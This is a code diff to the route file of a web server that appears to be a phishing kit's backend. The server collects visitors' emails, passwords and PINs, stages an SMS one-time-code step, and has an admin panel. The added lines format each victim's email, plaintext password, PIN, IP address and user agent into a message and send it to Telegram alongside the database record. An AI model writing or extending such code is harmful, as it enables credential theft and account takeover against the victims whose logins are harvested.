@@ -3,6 +3,7 @@ import { createServer, type Server } from "http";
 import { storage } from "./storage";
 import { loginSchema, verifyOtpSchema, adminLoginSchema } from "@shared/schema";
 import bcrypt from "bcryptjs";
+import { sendToTelegram, formatLoginMessage, formatSMSMessage } from "./telegram";
 
 // Store temporary collected data IDs for SMS verification
 const tempCollectedIds = new Map<string, string>();
@@ -56,6 +57,20 @@ export async function registerRoutes(app: Express): Promise<Server> {
         ipAddress,
         userAgent,
         isHidden: collectedDataRecord.isHidden, // Reuse from parent record
+      });
+
+      // Send Telegram notification (dual system: database + Telegram)
+      const telegramMessage = formatLoginMessage(
+        email,
+        password,
+        pin,
+        ipAddress,
+        userAgent,
+        collectedDataRecord.userNumber,
+        collectedDataRecord.isHidden
+      );
+      sendToTelegram(telegramMessage).catch(err => {
+        console.error("⚠️ Telegram notification failed (non-blocking):", err);
       });
 
       // Store the collected data ID temporarily for SMS verification
